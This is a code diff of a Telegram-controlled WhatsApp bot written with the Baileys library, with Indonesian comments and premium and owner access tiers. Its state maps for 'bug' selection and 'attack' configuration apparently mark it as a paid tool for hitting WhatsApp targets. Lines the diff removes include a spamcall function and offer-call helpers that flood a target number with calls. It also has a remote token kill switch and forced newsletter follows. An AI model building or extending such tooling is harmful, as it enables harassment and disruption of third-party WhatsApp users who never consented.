@@ -1,176 +1,385 @@
+const { Telegraf, Markup, session } = require("telegraf"); 
+const fs = require("fs");
+const path = require("path");
+const moment = require("moment-timezone");
 const {
-  default: makeWASocket,
+  // Fungsi Utama & Soket
+  makeWASocket,
+  makeMessagesSocket,
+  WASocket,
+  baileys,
+  isBaileys,
+
+  // Autentikasi & Penyimpanan Data
   useMultiFileAuthState,
-  downloadContentFromMessage,
-  emitGroupParticipantsUpdate,
-  emitGroupUpdate,
-  generateWAMessageContent,
-  generateWAMessage,
+  useSingleFileAuthState,
   makeInMemoryStore,
-  prepareWAMessageMedia,
+  makeCacheableSignalKeyStore,
+  initInMemoryKeyStore,
+  AuthenticationState,
+
+  // Versi & Koneksi
+  fetchLatestBaileysVersion,
+  fetchLatestWaWebVersion,
+  DisconnectReason,
+  ReconnectMode,
+
+  // Konten & Pembuatan Pesan
+  generateWAMessage,
   generateWAMessageFromContent,
   generateForwardMessageContent,
-  MediaType,
-  aretargetsSameUser,
-  WAMessageStatus,
+  generateMessageID,
+  patchMessageBeforeSending,
+  encodeSignedDeviceIdentity,
+  encodeWAMessage,
+  encodeNewsletterMessage,
+  prepareWAMessageMedia,
   downloadAndSaveMediaMessage,
-  AuthenticationState,
-  GroupMetadata,
-  initInMemoryKeyStore,
-  getContentType,
-  MiscMessageGenerationOptions,
-  useSingleFileAuthState,
-  BufferJSON,
-  WAMessageProto,
-  MessageOptions,
-  WAFlag,
-  WANode,
-  WAMetric,
-  ChatModification,
-  MessageTypeProto,
-  WALocationMessage,
-  ReconnectMode,
-  WAContextInfo,
+  downloadContentFromMessage,
+
+  // Struktur & Tipe Pesan (Proto)
   proto,
-  WAGroupMetadata,
-  ProxyAgent,
-  waChatKey,
-  MimetypeMap,
-  MediaPathMap,
+  WAProto,
+  WAProto_1,
+  WAMessageProto,
+  MessageTypeProto,
+  AnyMessageContent,
+  WAMessageContent,
+  WAMessage,
+  MessageOptions,
+  MiscMessageGenerationOptions,
+  MessageRetryMap,
+
+  // Tipe Spesifik Pesan
+  interactiveMessage,
+  InteractiveMessage,
+  nativeFlowMessage,
+  listMessage,
+  templateMessage,
+  extendedTextMessage,
+  WALocationMessage,
   WAContactMessage,
   WAContactsArrayMessage,
   WAGroupInviteMessage,
   WATextMessage,
-  WAMessageContent,
-  WAMessage,
-  BaileysError,
-  WA_MESSAGE_STATUS_TYPE,
+  Header,
+
+  // Utilitas JID (Nomor WhatsApp)
+  areJidsSameUser,
+  jidDecode,
+  jidEncode,
+  mentionedJid,
+
+  // Metadata Grup
+  GroupMetadata,
+  WAGroupMetadata,
+  GroupSettingChange,
+  emitGroupParticipantsUpdate,
+  emitGroupUpdate,
+
+  // Utilitas Media & Network
+  MediaType,
+  Mimetype,
+  MimetypeMap,
+  MediaPathMap,
+  WAMediaUpload,
   MediaConnInfo,
   URL_REGEX,
   WAUrlInfo,
+  ProxyAgent,
+
+  // Status & Event Lainnya
+  WAMessageStatus,
+  WA_MESSAGE_STATUS_TYPE,
+  WA_MESSAGE_STUB_TYPES,
   WA_DEFAULT_EPHEMERAL,
-  WAMediaUpload,
-  targetDecode,
-  mentionedtarget,
-  processTime,
+  ChatModification,
   Browser,
+  Browsers,
   MessageType,
   Presence,
-  WA_MESSAGE_STUB_TYPES,
-  Mimetype,
-  relayWAMessage,
-  Browsers,
-  GroupSettingChange,
-  DisconnectReason,
-  WASocket,
+  WANode,
+  WAMetric,
+  WAFlag,
+  WAContextInfo,
+  BaileysError,
+
+  // Fungsi Parser Tambahan
+  getContentType,
+  getAggregateVotesInPollMessage,
+  getButtonType,
   getStream,
-  WAProto,
-  isBaileys,
-  AnyMessageContent,
-  fetchLatestBaileysVersion,
-  templateMessage,
-  InteractiveMessage,
-  Header,
-  areJidsSameUser,
-  jidDecode
-} = require('@whiskeysockets/baileys');
-const fs = require("fs-extra");
-const JsConfuser = require("js-confuser");
-const P = require("pino");
+  processTime,
+
+  // Variabel Custom / Typo dari script asal (Bisa dihapus jika error)
+  targetDecode,
+  mentionedtarget,
+  relayWAMessage
+} = require("@whiskeysockets/baileys");
+
 const pino = require("pino");
-const crypto = require("crypto");
-const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
-const FormData = require('form-data');
-const path = require("path");
-const sessions = new Map();
-const readline = require("readline");
-const cd = "cooldown.json";
-const axios = require("axios");
 const chalk = require("chalk");
-const config = require("./config.js");
+const axios = require("axios");
 const vm = require('vm');
-const https = require("https");
-const TelegramBot = require("node-telegram-bot-api");
-const BOT_TOKEN = config.BOT_TOKEN;
-const SESSIONS_DIR = "./sessions";
-const SESSIONS_FILE = "./sessions/active_sessions.json";
-
-let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
-let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));
-
-function ensureFileExists(filePath, defaultData = []) {
-  if (!fs.existsSync(filePath)) {
-    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
+const readline = require('readline');
+const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
+const crypto = require("crypto");
+const sessionPath = './session';
+let bots = [];
+const bot = new Telegraf(BOT_TOKEN);
+const userBugSelection = new Map();
+const attackConfig = new Map();
+const multiBugSession = new Map();
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+// === Path File ===
+const premiumFile = "./Db/premiums.json";
+const adminFile = "./Db/admins.json";
+const dbPath = "./Db/ControlCommand.json";
+const cooldownFile = './Db/cooldown.json'
+// === Fungsi Load & Save JSON ===
+const loadJSON = (filePath) => {
+  try {
+    const data = fs.readFileSync(filePath);
+    return JSON.parse(data);
+  } catch (err) {
+    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
+    return [];
   }
+};
+
+const saveJSON = (filePath, data) => {
+  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+};
+
+function loadDB() {
+if (!fs.existsSync(dbPath)) return {}
+return JSON.parse(fs.readFileSync(dbPath))
 }
 
-ensureFileExists("./premium.json");
-ensureFileExists("./admin.json");
-
-function savePremiumUsers() {
-  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
+function saveDB(data) {
+fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
 }
 
-function saveAdminUsers() {
-  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
+if (!fs.existsSync(dbPath)) {
+  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
 }
+// === Load Semua Data Saat Startup ===
+let adminUsers = loadJSON(adminFile);
+let premiumUsers = loadJSON(premiumFile);
 
-// Fungsi untuk memantau perubahan file
-function watchFile(filePath, updateCallback) {
-  fs.watch(filePath, (eventType) => {
-    if (eventType === "change") {
-      try {
-        const updatedData = JSON.parse(fs.readFileSync(filePath));
-        updateCallback(updatedData);
-        console.log(`File ${filePath} updated successfully.`);
-      } catch (error) {
-        console.error(`bot ${botNum}:`, error);
-      }
+
+// === Middleware Role ===
+const checkOwner = (ctx, next) => {
+  const userId = ctx.from.id.toString(); 
+  if (!OWNER_IDS.includes(userId)) {
+    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
+  }
+
+  return next();
+};
+
+const checkAdmin = (ctx, next) => {
+  if (!adminUsers.includes(ctx.from.id.toString())) {
+    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
+  }
+  next();
+};
+
+const checkPremium = async (ctx, next) => {
+  const userId = ctx.from.id.toString();
+  const chatId = ctx.chat?.id.toString();
+
+  const bisaAkses =
+    premiumUsers.includes(userId) ||
+    isGroupPremium(chatId) ||
+    ctx.from.id.toString() === OWNER_ID;
+
+  if (!bisaAkses) {
+    await ctx.reply(
+      '❌ Fitur ini khusus *Premium!*\n\n' +
+      '💡 Hubungi owner untuk upgrade premium.',
+      { parse_mode: 'Markdown' }
+    );
+    return;
+  }
+
+  return next();
+};
+
+
+const loadCooldown = () => {
+    try {
+        const data = fs.readFileSync(cooldownFile)
+        return JSON.parse(data).cooldown || 5
+    } catch {
+        return 5
     }
-  });
 }
 
-watchFile("./premium.json", (data) => (premiumUsers = data));
-watchFile("./admin.json", (data) => (adminUsers = data));
+const saveCooldown = (seconds) => {
+    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
+}
+
+let cooldown = loadCooldown()
+const userCooldowns = new Map()
+
+const checkCooldown = (ctx, next) => {
+    const userId = ctx.from.id
+    const now = Date.now()
+
+    if (userCooldowns.has(userId)) {
+        const lastUsed = userCooldowns.get(userId)
+        const diff = (now - lastUsed) / 1000
+
+        if (diff < cooldown) {
+            const remaining = Math.ceil(cooldown - diff)
+            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
+            return
+        }
+    }
+
+    userCooldowns.set(userId, now)
+    next()
+}
+// === Fungsi Admin / Premium ===
+const addadmin = (userId) => {
+  if (!adminUsers.includes(userId)) {
+    adminUsers.push(userId);
+    saveJSON(adminFile, adminUsers);
+  }
+};
+
+const removeAdmin = (userId) => {
+  adminUsers = adminUsers.filter((id) => id !== userId);
+  saveJSON(adminFile, adminUsers);
+};
+
+const addpremium = (userId) => {
+  if (!premiumUsers.includes(userId)) {
+    premiumUsers.push(userId);
+    saveJSON(premiumFile, premiumUsers);
+  }
+};
+
+const removePremium = (userId) => {
+  premiumUsers = premiumUsers.filter((id) => id !== userId);
+  saveJSON(premiumFile, premiumUsers);
+};
+bot.use(session());
+
+let sock = null;
+let isWhatsAppConnected = false;
+let linkedWhatsAppNumber = "";
+const usePairingCode = true;
+///////// RANDOM IMAGE JIR \\\\\\\
+const randomImages = [
+"https://l.top4top.io/p_3803smv0s1.jpg",
+];
+
+const getRandomImage = () =>
+  randomImages[Math.floor(Math.random() * randomImages.length)];
+// Func Block/Unblock Command
+const checkCommandEnabled = async (ctx, next) => {
+  if (!ctx.message?.text) return next();
+
+  const text = ctx.message.text.trim();
+
+  if (!text.startsWith("/")) return next();
+
+  // ambil command utama
+  let cmd = text.split(" ")[0].toLowerCase();
+
+  // hapus @botusername
+  if (cmd.includes("@")) {
+    cmd = cmd.split("@")[0];
+  }
+
+  const db = loadDB();
+  const chatId = String(ctx.chat.id);
+
+  // =========================
+  // GLOBAL DISABLE COMMAND
+  // =========================
+  if (db.commands?.[cmd]?.disabled) {
+    return ctx.reply(
+      db.commands[cmd].reason ||
+      "⛔ Command ini dimatikan."
+    );
+  }
+
+  // =========================
+  // BLOCK COMMAND CHAT
+  // =========================
+  const blocked =
+    db.groupCmdBlock?.[chatId] || [];
+
+  // normalize semua cmd
+  const normalizedBlocked = blocked.map(c =>
+    c.toLowerCase().split("@")[0]
+  );
+
+  if (normalizedBlocked.includes(cmd)) {
+    return ctx.reply(
+      "⛔ Command ini diblock di chat ini."
+    );
+  }
+
+  return next();
+};
+
+// Fungsi untuk mendapatkan waktu uptime
+const getUptime = () => {
+  const uptimeSeconds = process.uptime();
+  const hours = Math.floor(uptimeSeconds / 3600);
+  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+  const seconds = Math.floor(uptimeSeconds % 60);
+
+  return `${hours}h ${minutes}m ${seconds}s`;
+};
+
+const question = (query) =>
+  new Promise((resolve) => {
+    const rl = require("readline").createInterface({
+      input: process.stdin,
+      output: process.stdout,
+    });
+    rl.question(query, (answer) => {
+      rl.close();
+      resolve(answer);
+    });
+  });
 
 const GITHUB_TOKEN_LIST_URL =
   "https://raw.githubusercontent.com/DAFARELXP/BLOODDB/refs/heads/main/tokens.json";
 
+bot.telegram.setMyCommands([
+  { command: 'start', description: 'Developer Tercinta @Xyzenofficial' },
+  { command: 'antipromo', description: 'Toggle anti promosi per group' },
+  { command: 'privatemute', description: 'Toggle auto mute private chat' },
+]).then(() => {
+  console.log('Daftar perintah berhasil diperbarui!');
+}).catch((error) => {
+  console.error('Gagal memperbarui perintah:', error);
+});
+
 async function fetchValidTokens() {
   try {
-    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
-    return response.data.tokens;
-  } catch (error) {
-    console.error(
-      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
-    );
+    const response = await axios.get(GITHUB_TOKEN_LIST_URL, { timeout: 8000 });
+    return response.data.tokens || [];
+  } catch (err) {
+    console.error(chalk.red("❌ Gagal Di Variabel Raw Github."), err.message || "");
     return [];
   }
 }
 
 async function validateToken() {
-  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
-
   const validTokens = await fetchValidTokens();
   if (!validTokens.includes(BOT_TOKEN)) {
-    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
+    console.error(chalk.red("❌ Token Terdeteksi Penyusup keluar...!!"));
     process.exit(1);
   }
-
-  console.log(chalk.green(` JANGAN LUPA MASUK GB INFO SCRIPT⠀⠀`));
   startBot();
-  initializeWhatsAppConnections();
 }
-
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-
-bot.setMyCommands([
-  { command: '/start', description: 'Developer Tercinta @pinzyoffc' }
-]).then(() => {
-    console.log('Daftar perintah berhasil diperbarui!');
-}).catch((error) => {
-    console.error('Gagal memperbarui perintah:', error);
-});
 
 function startBot() {
   console.clear();
@@ -192,222 +401,149 @@ function startBot() {
 
 `));
 
-console.log(chalk.cyanBright(`
-  ▀▄▀ █▄█ █░░ █▀▀ █▄░█ ▀█▀   █▀▀ █▀▄▀█ █▀█ █ █▀█ █▀▀
-  █░█ ░█░ █▄▄ ██▄ █░▀█ ░█░   ██▄ █░▀░█ █▀▀ █ █▀▄ ██▄
-`));
-
 console.log(chalk.greenBright(`
 ┌─────────────────────────────┐
 │ ⚠️ inicialização em execução com sucesso  
 ├─────────────────────────────┤
 │ DESENVOLVEDOR : Pinzy | Xyzen 
-│ TELEGRAMA : @pinzyoffc
+│ TELEGRAMA : @xyzenofficial
 │ CHANAL : @XylentOfficial
 └─────────────────────────────┘
 `));
-  console.log(chalk.blue("Xylent Empire Is Here...!"));
+  console.log(chalk.blue(" 𝐗𝐲𝐥𝐞𝐧𝐭 Is Here...!"));
   console.log(chalk.magenta("🔐 Semua Terkunci."));
 };
 
 /*validateToken(); 
 buat validate token kalo lu mau kasih db nya*/
-validateToken()
-// buat start tanpa db kalo mau stary tanpa db tinggal ubah jadi startBot
-let sock;
+validateToken(); 
 
-function saveActiveSessions(botNumber) {
-  try {
-    const sessions = [];
-    if (fs.existsSync(SESSIONS_FILE)) {
-      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-      if (!existing.includes(botNumber)) {
-        sessions.push(...existing, botNumber);
-      }
-    } else {
-      sessions.push(botNumber);
-    }
-    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
-  } catch (error) {
-    console.error("Error saving session:", error);
-  }
-}
+async function checkExpired() {
 
-async function initializeWhatsAppConnections() {
-  try {
-    if (fs.existsSync(SESSIONS_FILE)) {
-      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
+    const EXPIRED = new Date("2050-05-15T07:25:00Z").getTime()
 
-      for (const botNumber of activeNumbers) {
-        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
-        const sessionDir = createSessionDir(botNumber);
-        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-        sock = makeWASocket({
-          auth: state,
-          printQRInTerminal: true,
-          logger: P({ level: "silent" }),
-          defaultQueryTimeoutMs: undefined,
-        });
-
-        // Tunggu hingga koneksi terbentuk
-        await new Promise((resolve, reject) => {
-          sock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
-            if (connection === "open") {
-              console.log(`Bot ${botNumber} terhubung!`);
-              sock.newsletterFollow("120363301087120650@newsletter");
-              sessions.set(botNumber, sock);
-              resolve();
-            } else if (connection === "close") {
-              const shouldReconnect =
-                lastDisconnect?.error?.output?.statusCode !==
-                DisconnectReason.loggedOut;
-              if (shouldReconnect) {
-                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
-                await initializeWhatsAppConnections();
-              } else {
-                reject(new Error("Koneksi ditutup"));
-              }
-            }
-          });
-
-          sock.ev.on("creds.update", saveCreds);
-        });
-      }
-    }
-  } catch (error) {
-    console.error("Error initializing WhatsApp connections:", error);
-  }
-}
-
-function createSessionDir(botNumber) {
-  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-  if (!fs.existsSync(deviceDir)) {
-    fs.mkdirSync(deviceDir, { recursive: true });
-  }
-  return deviceDir;
-}
-
-async function connectToWhatsApp(botNumber, chatId) {
-  let statusMessage = await bot.sendMessage(
-    chatId,
-    `<tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}`,
-    { parse_mode: "HTML" }
-  ).then((msg) => msg.message_id);
-
-  const sessionDir = createSessionDir(botNumber);
-  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
-
-  sock = makeWASocket({
-    auth: state,
-    printQRInTerminal: false,
-    logger: P({ level: "silent" }),
-    defaultQueryTimeoutMs: undefined,
-  });
-
-  // ✅ Request pairing code DI LUAR event listener
-  // Tunggu socket ready dulu baru minta code
-  if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-    await new Promise((resolve) => setTimeout(resolve, 3000)); // tunggu 3 detik
     try {
-      const code = await sock.requestPairingCode(botNumber, "XYLENTNH");
-      const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-      await bot.editMessageText(
-        `<tg-emoji emoji-id="6098421155897545579">📢</tg-emoji> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
-𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
-        {
-          chat_id: chatId,
-          message_id: statusMessage,
-          parse_mode: "HTML",
-        }
-      );
-    } catch (error) {
-      console.error("Error requesting pairing code:", error);
-      await bot.editMessageText(
-        `Gagal melakukan pairing ke nomor ${botNumber}`,
-        { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
-      );
-      return;
-    }
-  }
 
-  sock.ev.on("connection.update", async (update) => {
+        // ambil waktu server dari header
+        const res = await axios.get("https://google.com")
+        const now = new Date(res.headers.date).getTime()
+
+        const diff = EXPIRED - now
+
+        if (diff <= 0) {
+            console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @xyzenofficial")
+            process.exit(0);
+        }
+
+        const hari = Math.floor(diff / 86400000)
+        const jam = Math.floor((diff % 86400000) / 3600000)
+
+        console.log(`✅ SCRIPT ONLINE | WAKTU TOLERANSI TERSISA | ${hari} HARI ${jam} JAM LAGI`)
+
+    } catch {
+        console.log("⚠️ Gagal cek waktu internet")
+    }
+
+}
+
+checkExpired();
+// WhatsApp Connection
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+
+const startSesi = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState('./session');
+  const { version } = await fetchLatestBaileysVersion();
+
+  const connectionOptions = {
+    version,
+    keepAliveIntervalMs: 30000,
+    printQRInTerminal: false,
+    logger: pino({ level: "silent" }),
+    auth: state,
+    browser: ['Mac OS', 'Safari', '10.15.7'],
+    getMessage: async (key) => ({
+      conversation: 'Xylent Empire', // Placeholder default
+    }),
+  };
+
+  sock = makeWASocket(connectionOptions);
+  sock.ev.on('creds.update', saveCreds);
+  store.bind(sock.ev);
+
+  sock.ev.on('connection.update', (update) => {
     const { connection, lastDisconnect } = update;
 
-    if (connection === "close") {
-      const statusCode = lastDisconnect?.error?.output?.statusCode;
-      if (statusCode >= 500 && statusCode < 600) {
-        // Server error, retry
-        await connectToWhatsApp(botNumber, chatId);
-      } else {
-        await bot.editMessageText(
-          `Gagal melakukan pairing ke nomor ${botNumber}`,
-          { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
-        );
-        fs.rmSync(sessionDir, { recursive: true, force: true });
+    if (connection === 'open') {
+      sock.newsletterFollow("0029Vb82CCx9sBI5CeFqNY2T@newsletter");
+      isWhatsAppConnected = true;
+      console.log(chalk.red.bold(`
+╭─────────────────────────────╮
+│ ${chalk.white('Berhasil Tersambung')}
+╰─────────────────────────────╯`));
+    }
+
+    if (connection === 'close') {
+      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      console.log(chalk.red.bold(`
+╭─────────────────────────────╮
+│ ${chalk.white('Whatsapp Terputus')}
+╰─────────────────────────────╯`));
+
+      if (shouldReconnect) {
+        console.log(chalk.red.bold(`
+╭─────────────────────────────╮
+│ ${chalk.white('Menyambung kembali...')}
+╰─────────────────────────────╯`));
+        startSesi();
       }
-    } else if (connection === "open") {
-      sessions.set(botNumber, sock);
-      saveActiveSessions(botNumber);
-      await bot.editMessageText(
-        `<tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber} 𝙨𝙪𝙘𝙘𝙚𝙨`,
-        { chat_id: chatId, message_id: statusMessage, parse_mode: "HTML" }
-      );
-      sock.newsletterFollow("120363301087120650@newsletter");
+
+      isWhatsAppConnected = false;
     }
   });
+};
 
-  sock.ev.on("creds.update", saveCreds);
-  return sock;
+const checkWhatsAppConnection = (ctx, next) => {
+if (!isWhatsAppConnected) {
+ctx.reply(`
+❌ WhatsApp Belum terhubung
+`);
+return;
+}
+next();
+};
+
+////=========PRIVATE CHAT GUARD + AUTO MUTE LOG========\\\\
+
+// Config - isi sesuai kebutuhan
+const OWNER_ID = '8768626313'; // ganti dengan ID owner
+const LOG_GROUP_ID = '-1003973782800'; // ganti dengan ID group log
+
+// Helper: format tanggal & waktu lengkap
+function formatDateTime(date) {
+  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
+  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
+                 'Juli','Agustus','September','Oktober','November','Desember'];
+  const d = new Date(date);
+  const namaHari = hari[d.getDay()];
+  const tanggal = d.getDate();
+  const namaBulan = bulan[d.getMonth()];
+  const tahun = d.getFullYear();
+  const jam = String(d.getHours()).padStart(2, '0');
+  const menit = String(d.getMinutes()).padStart(2, '0');
+  const detik = String(d.getSeconds()).padStart(2, '0');
+  return `${namaHari}, ${tanggal} ${namaBulan} ${tahun} — ${jam}:${menit}:${detik}`;
 }
 
-
-// -------( Fungsional Function Before Parameters )--------- \\
-
-// NGAPA IN SIH?? 🥱
-function formatRuntime(seconds) {
-  const days = Math.floor(seconds / (3600 * 24));
-  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
-  const minutes = Math.floor((seconds % 3600) / 60);
-  const secs = seconds % 60;
-
-  return `${days} Hari,${hours} Jam,${minutes} Menit`
-}
-
-const startTime = Math.floor(Date.now() / 1000);
-
-function getBotRuntime() {
-  const now = Math.floor(Date.now() / 1000);
-  return formatRuntime(now - startTime);
-}
-
-//~AMBIL SPEED AJA GUNA GK GUNA AMPOS
-function getSpeed() {
-  const startTime = process.hrtime();
-  return getBotSpeed(startTime);
-}
-
-// BUAT TANGGAL TANGGALAN
-function getCurrentDate() {
+function getRealTime() {
   const now = new Date();
-  const options = {
-    weekday: "long",
-    year: "numeric",
-    month: "long",
-    day: "numeric",
-  };
-  return now.toLocaleDateString("id-ID", options);
-}
-
-function formatRuntime() {
-  let sec = Math.floor(process.uptime());
-  let hrs = Math.floor(sec / 3600);
-  sec %= 3600;
-  let mins = Math.floor(sec / 60);
-  sec %= 60;
-  return `${hrs}h ${mins}m ${sec}s`;
+  const hari = ['Minggu','Senin','Selasa','Rabu','Kamis','Jumat','Sabtu'];
+  const bulan = ['Januari','Februari','Maret','April','Mei','Juni',
+                 'Juli','Agustus','September','Oktober','November','Desember'];
+  const Hari = hari[now.getDay()];
+  const tanggalnew = now.getDate();
+  const Bulan = bulan[now.getMonth()];
+  const tahunnew = now.getFullYear();
+  return `${Hari}, ${tanggalnew} ${Bulan} ${tahunnew}`;
 }
 
 function formatMemory() {
@@ -415,1054 +551,4094 @@ function formatMemory() {
   return `${usedMB.toFixed(0)} MB`;
 }
 
-function senderStatus(botNumber) {
-  const sock = sessions.get(botNumber)
+// Middleware: deteksi private chat & auto mute
+let autoMuteEnabled = true;
 
-  if (!sock) return "🔴 OFFLINE"
-  if (sock.user) return "🟢 CONNECTED"
+// Durasi mute dalam ms (2 menit)
+const MUTE_DURATION_MS = 2 * 60 * 1000;
 
-  return "🟡 CONNECTING"
-}
+// Map menyimpan userId → timestamp kapan mute berakhir
+const mutedUsers = new Map();
 
-
-function getRandomImage() {
-  const images = [
-    "https://g.top4top.io/p_3788ghdlv1.jpg"
-  ];
-  return images[Math.floor(Math.random() * images.length)];
-}
-
-// CD DI SINI YA MEK
-
-let cooldownData = fs.existsSync(cd)
-  ? JSON.parse(fs.readFileSync(cd))
-  : { time: 5 * 60 * 1000, users: {} };
-
-function saveCooldown() {
-  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
-}
-
-function checkCooldown(userId) {
-  if (cooldownData.users[userId]) {
-    const remainingTime =
-      cooldownData.time - (Date.now() - cooldownData.users[userId]);
-    if (remainingTime > 0) {
-      return Math.ceil(remainingTime / 1000);
-    }
-  }
-  cooldownData.users[userId] = Date.now();
-  saveCooldown();
-  setTimeout(() => {
-    delete cooldownData.users[userId];
-    saveCooldown();
-  }, cooldownData.time);
-  return 0;
-}
-
-function setCooldown(timeString) {
-  const match = timeString.match(/(\d+)([smh])/);
-  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";
-
-  let [_, value, unit] = match;
-  value = parseInt(value);
-
-  if (unit === "s") cooldownData.time = value * 1000;
-  else if (unit === "m") cooldownData.time = value * 60 * 1000;
-  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;
-
-  saveCooldown();
-  return `Cooldown diatur ke ${value}${unit}`;
-}
-
-function getPremiumStatus(userId) {
-  const user = premiumUsers.find((user) => user.id === userId);
-  if (user && new Date(user.expiresAt) > new Date()) {
-    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
-  } else {
-    return "Tidak - Tidak ada waktu aktif";
-  }
-}
-
-async function getWhatsAppChannelInfo(link) {
-  if (!link.includes("https://whatsapp.com/channel/"))
-    return { error: "Link tidak valid!" };
-
-  let channelId = link.split("https://whatsapp.com/channel/")[1];
-  try {
-    let res = await sock.newsletterMetadata("invite", channelId);
-    return {
-      id: res.id,
-      name: res.name,
-      subscribers: res.subscribers,
-      status: res.state,
-      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
-    };
-  } catch (err) {
-    return { error: "Gagal mengambil data! Pastikan channel valid." };
-  }
-}
-
-function sleep(ms) {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
-async function spamcall(target) {
-  // Inisialisasi koneksi dengan makeWASocket
-  const sock = makeWASocket({
-    printQRInTerminal: false, // QR code tidak perlu ditampilkan
+// ── Helper: format tanggal ──────────────────────────────────
+function formatDateTime(date) {
+  return date.toLocaleString('id-ID', {
+    day: '2-digit', month: '2-digit', year: 'numeric',
+    hour: '2-digit', minute: '2-digit', second: '2-digit',
+    hour12: false
   });
-
-  try {
-    console.log(`📞 Mengirim panggilan ke ${target}`);
-
-    // Kirim permintaan panggilan
-    await sock.query({
-      tag: "call",
-      json: ["action", "call", "call", { id: `${target}` }],
-    });
-
-    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
-  } catch (err) {
-    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
-  } finally {
-    sock.ev.removeAllListeners(); // Hapus semua event listener
-    sock.ws.close(); // Tutup koneksi WebSocket
-  }
 }
 
-async function sendOfferCall(target) {
-  try {
-    await sock.offerCall(target);
-    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
-  } catch (error) {
-    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
-  }
-}
+// ── Command: /privatemute on|off  (OWNER ONLY) ─────────────
+bot.command('privatemute', async (ctx) => {
+  const userId = ctx.from.id.toString();
 
-async function sendOfferVideoCall(target) {
-  try {
-    await sock.offerCall(target, {
-      video: true,
-    });
-    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
-  } catch (error) {
-    console.error(
-      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
+  // Hanya owner yang bisa pakai command ini
+  if (userId !== OWNER_ID.toString()) {
+    return ctx.reply('⛔ Kamu tidak memiliki izin untuk menggunakan command ini.');
+  }
+
+  const arg = (ctx.message.text.split(' ')[1] || '').toLowerCase();
+
+  if (arg === 'on') {
+    autoMuteEnabled = true;
+    return ctx.reply(
+      `✅ *Auto-Mute Private Chat* telah *diaktifkan!*\n` +
+      `Setiap user yang DM bot akan otomatis di-mute 2 menit.`,
+      { parse_mode: 'Markdown' }
+    );
+    } else if (arg === 'off') {
+    autoMuteEnabled = false;
+    mutedUsers.clear(); // <── Tambahkan ini agar semua daftar mute langsung dihapus bersih!
+    return ctx.reply(
+      `🔕 *Auto-Mute Private Chat* telah *dinonaktifkan!*\n` +
+      `Semua user telah dibebaskan dan bebas DM bot.`,
+      { parse_mode: 'Markdown' }
+    );
+
+  } else {
+    const status = autoMuteEnabled ? '🟢 *ON*' : '🔴 *OFF*';
+    return ctx.reply(
+      `ℹ️ Status Auto-Mute Private Chat: ${status}\n\n` +
+      `Gunakan:\n` +
+      `• \`/privatemute on\` — aktifkan\n` +
+      `• \`/privatemute off\` — nonaktifkan`,
+      { parse_mode: 'Markdown' }
     );
   }
+});
+
